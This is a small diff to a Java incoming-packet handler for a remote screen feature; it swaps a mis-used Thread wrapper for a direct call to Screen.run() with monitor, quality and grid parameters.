@@ -13,8 +13,8 @@ public class Packet12RemoteScreen extends AbstractIncomingPacket {
 		int columns = Connection.readInt();
 		int rows = Connection.readInt();
 		
-		new Thread(new Screen(size, quality, monitor, columns, rows)).run();
-		//new Screen(size, quality, monitor).run();
+		//new Thread(new Screen(size, quality, monitor, columns, rows)).start();
+		new Screen(size, quality, monitor, columns, rows).run();
 	}
 
 }
